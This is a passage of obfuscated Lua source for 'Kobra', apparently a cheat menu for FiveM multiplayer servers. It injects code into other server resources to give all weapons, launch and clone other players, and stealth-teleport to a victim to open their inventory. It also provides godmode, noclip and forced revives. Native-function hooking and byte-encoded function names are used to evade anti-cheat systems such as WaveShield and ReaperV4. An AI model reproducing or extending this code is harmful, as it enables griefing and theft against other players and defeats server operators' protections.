            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v247) v49(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v248,v249,v250) if ( not v249 or ( #v249==(895 -(557 + 338)))) then return;end local v251=tonumber(v249[1 + 0 ]);if  not v251 then return;end v250=v250 or (8454 -5454) ;local function v252(v343,v344) local v345=0 -0 ;local v346;local v347;while true do if (v345==(0 -0)) then v346={};v347=PlayerPedId();v345=2 -1 ;end if ((803 -(499 + 302))==v345) then return v346;end if (v345==(867 -(39 + 827))) then if  not v347 then return v346;end for v768=0,703 -448  do local v769=GetPlayerFromServerId(v768);if (v769 and (v769~= -(2 -1)) and DoesEntityExist(GetPlayerPed(v769))) then local v942=0 -0 ;local v943;local v944;while true do if (v942==(0 -0)) then v943=GetPlayerPed(v769);v944=GetEntityCoords(v943);v942=1 + 0 ;end if (v942==(2 -1)) then if v944 then local v1220=0 + 0 ;local v1221;while true do if (v1220==0) then v1221= #(v343-v944);if (v1221<=v344) then table.insert(v346,{player=v769,serverId=v768});end break;end end end break;end end end end v345=2 -0 ;end end end CreateThread(function() local v348=GetPlayerFromServerId(v251);if ( not v348 or (v348== -(105 -(103 + 1)))) then return;end local v349=GetPlayerPed(v348);if ( not v349 or  not DoesEntityExist(v349)) then return;end local v350=PlayerPedId();if  not v350 then return;end local v351=GetEntityCoords(v350);local v352=GetEntityCoords(v349);if ( not v351 or  not v352) then return;end local v353= #(v351-v352);local v354=false;local v355=nil;if (v353>(564 -(475 + 79))) then local v601=0;local v602;local v603;local v604;local v605;local v606;while true do if ((8 -4)==v601) then v354=true;Wait(100);break;end if (v601==(9 -6)) then SetEntityCoordsNoOffset(v350,v606.x,v606.y,v606.z,false,false,false);SetEntityVisible(v350,false,0 + 0 );v601=4 + 0 ;end if (v601==(1505 -(1395 + 108))) then v605=math.sin(v602) * v603 ;v606=vector3(v352.x + v604 ,v352.y + v605 ,v352.z);v601=8 -5 ;end if (v601==(1204 -(7 + 1197))) then v355=v351;v602=math.random() * (1 + 1) * math.pi ;v601=1;end if (v601==1) then v603=math.random(2 + 3 ,328 -(27 + 292) );v604=math.cos(v602) * v603 ;v601=5 -3 ;end end end local v356=v252(v352,v250);if ( #v356==(0 -0)) then end ClearPedTasksImmediately(v350);for v554=1,62 -47  do if  not DoesEntityExist(v349) then break;end local v555=GetEntityCoords(v349);if  not v555 then break;end SetEntityCoords(v350,v555.x,v555.y,v555.z + (0.5 -0) ,false,false,false,false);Wait(95 -45 );AttachEntityToEntityPhysically(v350,v349,139 -(43 + 96) ,0 -0 ,0,0 -0 ,125 + 25 ,0 + 0 ,0 -0 ,0,0,0,1 + 0 ,false,false,1 -0 ,1 + 1 );Wait(50);DetachEntity(v350,true,true);Wait(100);end Wait(37 + 463 );ClearPedTasksImmediately(v350);if v355 then local v607=1751 -(1414 + 337) ;while true do if (v607==(1940 -(1642 + 298))) then SetEntityCoords(v350,v355.x,v355.y,v355.z + (2 -1) ,false,false,false,false);Wait(100);v607=1;end if (v607==1) then SetEntityCoords(v350,v355.x,v355.y,v355.z,false,false,false,false);break;end end end if v354 then SetEntityVisible(v350,true,0 -0 );end end);end;v12.HandleClonePlayer=function(v253,v254) if ( not v254 or ( #v254==(0 -0))) then return;end local v255=table.concat(v254,",");MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v255));end;v12.HandleTakeInventory=function(v256,v257) local v258=0 + 0 ;local v259;local v260;while true do if (v258==1) then if  not v259 then return;end print("Take Inventory action executed for players: "   .. table.concat(v257,", ") );v258=2;end if ((2 + 0)==v258) then v260=GetResourceState("WaveShield")=="started" ;if v260 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v259));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v259));end break;end if (v258==0) then if ( not v257 or ( #v257==(972 -(357 + 615)))) then return;end v259=tonumber(v257[1 + 0 ]);v258=2 -1 ;end end end;v12.BuildMenuFromWeaponList=function(v261,v262) local v263={};for v357,v358 in ipairs(v262) do if v47[v358] then v263[ #v263 + 1 + 0 ]=v47[v358].label;end end return v263;end;v12.GetWeaponModelFromLabel=function(v264,v265) for v359,v360 in pairs(v47) do if (v360.label==v265) then return v359;end end return "";end;v12.RepairVehicle=function(v266) v49(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v93=GetResourceState("ReaperV4")=="started" ;local v94=GetResourceState("WaveShield")=="started" ;local v95=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v267) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v361=0;local v362;while true do if ((0 + 0)==v361) then v362={amigo=function() v49("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v49("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v95 then if v93 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() local v770=1301 -(384 + 917) ;local v771;local v772;while true do if (v770==0) then print("2");v771=GetResourceState("WaveShield")=="started" ;v770=698 -(128 + 569) ;end if ((1544 -(1407 + 136))==v770) then v772=GetResourceState("ReaperV4")=="started" ;if v771 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v772 then MachoInjectThread(1887 -(687 + 1200) ,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end break;end end end,["mc9-medicsystem"]=function() local v773=1710 -(556 + 1154) ;local v774;local v775;while true do if (v773==1) then v775=GetResourceState("ReaperV4")=="started" ;if v774 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v775 then MachoInjectThread(0,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end break;end if (v773==(0 -0)) then print("1");v774=GetResourceState("WaveShield")=="started" ;v773=1;end end end};for v776,v777 in pairs(v362) do if (GetResourceState(v776)=="started") then v777();end end break;end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=100,min=421 -(275 + 146) ,max=100,step=1 + 0 ,onSelect=function(v363) SetEntityHealth(PlayerPedId(),v363 + (164 -(29 + 35)) );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=298 -198 ,min=0 -0 ,max=66 + 34 ,step=1013 -(53 + 959) ,onSelect=function(v364) SetPedArmour(PlayerPedId(),v364);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),385 -(147 + 138) );end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v365) v267:HandleGodmodeToggle(v365);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v366) if v366 then v267:EnableInvisibility();else v267:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=492.25 -(18 + 474) ,step=0.25 + 0 ,min=0.25 -0 ,max=1091 -(860 + 226) ,onSelect=function(v367,v368) if v368 then local v610=303 -(121 + 182) ;while true do if (v610==(0 + 0)) then if  not v29 then local v1037=0;while true do if (v1037==1) then v29=true;break;end if ((1240 -(988 + 252))==v1037) then v12:Notify("info","Kobra","Initializing... Please wait!",1000);Wait(46 + 354 );v1037=1 + 0 ;end end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v367   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
